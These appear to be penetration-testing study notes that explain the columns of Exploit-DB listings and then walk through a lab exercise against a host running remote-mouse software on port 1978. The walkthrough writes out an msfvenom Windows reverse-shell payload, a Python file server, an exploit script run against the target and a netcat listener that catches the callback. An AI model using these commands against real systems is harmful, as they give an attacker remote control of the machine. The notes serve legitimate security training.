```
The D field is a quick way we can download the exploit file.

The A field lists the vulnerable application files of respective exploits which we can download for research and testing (if available).

The V field marks whether the exploit has been verified. Exploits with the verified checkmark have been reviewed, executed, and concluded to be a functioning exploit. These are reviewed by trusted members and add further assurance that the exploit is safe and functional.

The Title field will usually give the vulnerable application name along with its respective vulnerable version and the function of the exploit.

The Type field designates the exploit as one of the following: dos, local, remote, or webapp.

The Platform field designates which kind of system(s) are affected by the exploit. This can be operating systems, hardware, or even code language services such as PHP.

The last field designates the Author of the exploit.

#### Exploiting a Target




##### Q1:

nmap and see port 1978, also smb ports. Poke around through anon login and see mouse pointer. Look up that software in exploit db. 

Create msfvenom payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=443 -f exe > reverse.exe
```

Create python simple http server:
```
python3 -m http.server
```

use exploit:
```
python3 50972.py 192.168.238.10 192.168.45.221 reverse.exe
```

Create netcat listener to catch callback:
```
nc -nvlp 443
```
